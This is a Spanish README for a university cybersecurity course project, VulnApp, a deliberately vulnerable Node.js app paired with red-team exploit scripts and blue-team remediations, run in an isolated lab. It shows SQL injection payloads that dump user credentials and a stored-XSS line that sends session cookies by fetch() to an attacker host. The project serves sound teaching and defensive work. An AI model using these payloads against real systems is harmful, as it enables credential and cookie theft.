# VulnApp — Simulación de Ataque Informático y Remediación

> **Universidad Católica Andrés Bello · Facultad de Ingeniería · Ciberseguridad**  
> Profesora: Francis Ferrer  

---

## ⚠ AVISO LEGAL

Este repositorio contiene código **deliberadamente inseguro** con propósitos **exclusivamente educativos** en el contexto del curso de Ciberseguridad de la UCAB. Todos los ataques documentados se realizan en un **entorno de red aislado (VirtualBox Host-Only)**. Está **prohibido** ejecutar estos exploits en sistemas sin autorización explícita por escrito.

---

## 🎯 Descripción del Proyecto

**VulnApp** es una aplicación web monolítica que implementa deliberadamente las vulnerabilidades **A05:2025 Inyección** y **A04:2025 Fallas Criptográficas** del OWASP Top 10 2025, permitiendo:

1. Demostración técnica del ciclo completo de intrusión (Cyber Kill Chain)
2. Implementación de contramedidas nativas en Node.js v20 (sin librerías de seguridad)
3. Validación de la ineficacia de los exploits tras la remediación

---

## 👥 Equipo

| Equipo      | Integrante        | C.I.        | Rama principal        |
|-------------|-------------------|-------------|-----------------------|
| 🔴 Red Team | Maurizio Brazón   | 30.514.308  | `feature/injection`   |
| 🔴 Red Team | César Sánchez     | 28.310.444  | `feature/injection`   |
| 🔴 Red Team | Eduard Velasco    | 30.700.089  | `feature/crypto-failures` |
| 🔵 Blue Team| César Reyes       | 31.101.802  | `feature/injection`   |
| 🔵 Blue Team| Marco Cegarra     | 30.967.516  | `feature/crypto-failures` |
| 🔵 Blue Team| Sebastián Cova    | 30.142.979  | `feature/crypto-failures` |

---

## 🏗 Stack Tecnológico

| Capa             | Tecnología           | Versión   |
|------------------|----------------------|-----------|
| Backend          | Node.js + Express.js | v20 LTS   |
| Base de datos    | SQLite (better-sqlite3) | v9.x   |
| Frontend         | HTML5 + CSS3 + Vanilla JS | —    |
| OS Víctima       | Ubuntu Server        | 22.04 LTS |
| OS Atacante      | Kali Linux           | 2024.x    |
| Hipervisor       | VirtualBox           | 7.x       |
| Red              | Host-Only (192.168.56.0/24) | —   |

---

## 📁 Estructura del Repositorio

```
vulnapp/
├── vulnerable/           # Versión insegura (rama: main/vulnerable)
│   ├── server.js         # Backend con SQLi, MD5, cookie Base64
│   ├── public/
│   │   └── index.html    # Frontend con innerHTML vulnerable (XSS)
│   └── package.json
│
├── secure/               # Versión asegurada (merge: feature/injection + feature/crypto-failures)
│   ├── server.js         # Backend con sentencias preparadas, scrypt, HMAC
│   ├── public/
│   │   └── index.html    # Frontend con textContent (sin XSS)
│   └── package.json
│
├── red-team/             # Scripts de explotación manual (Red Team)
│   ├── 01_reconocimiento.py          # Fase I CKC: Enumeración de endpoints
│   ├── 02_exploit_sqli.py            # Fases III+IV: SQL Injection (CWE-89)
│   ├── 03_exploit_cookie_tampering.py # Fases III+IV: Cookie Base64 (CWE-345)
│   ├── 04_xss_worm_payload.py        # Fases V+VI: XSS Worm + C2 listener
│   ├── 05_hashcat_demo.sh            # Fase VII: Cracking MD5 (CWE-759/916)
│   └── 06_verificacion_contramedidas.py # Validación de cierre (Blue Team)
│
└── docs/
    ├── IMPACTO_CVSS.md               # Análisis CVSS v4.0
    ├── PAYLOADS_REFERENCIA.txt       # Payloads documentados
    └── GITHUB_WORKFLOW.md            # Guía de distribución de commits
```

---

## 🚀 Instrucciones de Despliegue

### Prerrequisitos (Ubuntu Server 22.04 — Nodo Víctima)

```bash
# Instalar Node.js v20
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt-get install -y nodejs

# Verificar versión
node --version   # Debe mostrar v20.x.x
```

### Versión Vulnerable

```bash
cd vulnerable/
npm install
node server.js
# Backend en http://0.0.0.0:4000
# Frontend en http://0.0.0.0:4000 (archivos estáticos en /public)
```

### Versión Segura

```bash
cd secure/
npm install
node server.js
# Backend en http://0.0.0.0:4000
```

### Scripts Red Team (Kali Linux — 192.168.56.10)

```bash
# Fase I: Reconocimiento
python3 red-team/01_reconocimiento.py

# Fases III+IV: SQL Injection
python3 red-team/02_exploit_sqli.py

# Fases III+IV: Cookie Tampering
python3 red-team/03_exploit_cookie_tampering.py

# Fases V+VI: XSS Worm + C2
python3 red-team/04_xss_worm_payload.py

# Fase VII: Cracking MD5
bash red-team/05_hashcat_demo.sh

# Validación de cierre (contra servidor seguro)
python3 red-team/06_verificacion_contramedidas.py
```

---

## 🗺 Vulnerabilidades Implementadas

### ID-1: Inyección (A05:2025)

| Vulnerabilidad | Endpoint           | CWE    | Payload de ejemplo |
|----------------|--------------------|--------|--------------------|
| SQL Injection  | POST /api/login    | CWE-89 | `' OR '1'='1'--`  |
| SQL UNION      | POST /api/search   | CWE-89 | `' UNION SELECT username,password,email FROM users--` |
| SQLi en ruta   | GET /api/users/:id | CWE-89 | `0 UNION SELECT username,password,role,email FROM users--` |
| Stored XSS     | POST /api/message  | CWE-79 | `<script>fetch('http://192.168.56.10:8888/?c='+document.cookie)</script>` |
| XSS Output     | GET /api/messages  | CWE-116| innerHTML sin sanitizar |

### ID-2: Fallas Criptográficas (A04:2025)

| Vulnerabilidad              | Endpoint           | CWE         | Descripción |
|-----------------------------|--------------------|-------------|-------------|
| MD5 sin salt                | POST /api/register | CWE-327/759/916 | Contraseñas hasheadas con MD5 puro |
| Cookie Base64 sin HMAC      | POST /api/login    | CWE-345/311 | Sesión en Base64 manipulable |

---

## 🛡 Contramedidas Implementadas (Blue Team)

| Falla            | Contramedida                        | API Node.js Nativa     |
|------------------|-------------------------------------|------------------------|
| CWE-89 SQLi      | Sentencias preparadas               | `db.prepare('... WHERE col = ?')` |
| CWE-79/116 XSS   | Escape HTML + `textContent`         | Función `escapeHtml()` custom |
| CWE-327/759/916  | scrypt KDF + salt CSPRNG 16 bytes   | `crypto.scryptSync()` + `crypto.randomBytes()` |
| CWE-345/311      | Cookie firmada HMAC-SHA256          | `crypto.createHmac('sha256', SECRET)` |
| Timing Attack    | Comparación en tiempo constante     | `crypto.timingSafeEqual()` |

### 👁️ Detección de Intrusiones (Blue Team)

Para identificar los ataques en tiempo real y post-mortem, el Blue Team implementará los siguientes mecanismos de monitoreo:
1. **Observación de Datos en Tránsito:** Subrutina en Node.js que escucha los buffers de entrada (`req.on('data')`) e imprime en la consola (`console.log`) los payloads maliciosos en texto plano.
2. **Registro y Correlación de Logs:** Uso de la función nativa `fs.appendFileSync()` para registrar en disco ráfagas de códigos HTTP 500 originados por errores de sintaxis en las inyecciones SQL.
3. **Identificación Técnica Post-Explotación:** Interacción nativa con la base de datos usando `sqlite3 vulnapp.db` para realizar búsquedas forenses manuales (ej. `SELECT * FROM messages WHERE content LIKE '%<script>%';`).

---

## 🔗 Inventario de Endpoints

| Método | Endpoint         | Descripción                    | Vulnerabilidades      |
|--------|------------------|--------------------------------|-----------------------|
| POST   | /api/register    | Alta de usuarios               | CWE-327, CWE-759, CWE-916 |
| POST   | /api/login       | Autenticación                  | CWE-89, CWE-345, CWE-311 |
| GET    | /api/profile     | Perfil (usa cookie)            | CWE-345, CWE-311      |
| GET    | /api/users/:id   | Consulta por ID                | CWE-89                |
| POST   | /api/search      | Búsqueda de usuarios           | CWE-89                |
| POST   | /api/message     | Envío de mensajes              | CWE-79                |
| GET    | /api/messages    | Lectura de mensajes            | CWE-116               |

---

## 🧪 Prueba de Conectividad

```bash
# Desde Kali (192.168.56.10) verificar alcance al servidor víctima (192.168.56.20)
ping -c 4 192.168.56.20

# Verificar que el backend responde
curl http://192.168.56.20:4000/api/profile
# Debe retornar: {"error":"No autenticado"}

# Verificar endpoint de registro
curl -X POST http://192.168.56.20:4000/api/register \
     -H "Content-Type: application/json" \
     -d '{"username":"test","password":"test123"}'
```

---

## 📊 Mapeo CWE → OWASP → CKC

| CWE     | Descripción                                   | OWASP 2025   | Fase CKC       | Justificación OWASP |
|---------|-----------------------------------------------|--------------|----------------|---------------------|
| CWE-89  | SQL Injection                                 | A05:2025     | III + IV       | Debilidad fundacional de inyección en BD |
| CWE-79  | Stored XSS                                    | A05:2025     | III + V + VI   | Inyección de código en el cliente |
| CWE-116 | Improper Output Encoding                      | A05:2025     | V              | Permite ejecución de scripts (XSS) |
| CWE-327 | Broken Cryptographic Algorithm (MD5)          | A04:2025     | II + VII       | Algoritmo obsoleto y roto criptográficamente |
| CWE-759 | One-Way Hash without Salt                     | A04:2025     | II + VII       | Vulnerable a rainbow tables |
| CWE-916 | Insufficient Computational Effort             | A04:2025     | II + VII       | Permite fuerza bruta veloz |
| CWE-345 | Insufficient Verification of Data Authenticity| A04:2025     | III + IV       | Falta de firma (HMAC) permite manipulación |
| CWE-311 | Missing Encryption of Sensitive Data          | A04:2025     | III + IV       | Información sensible en Base64 plano |
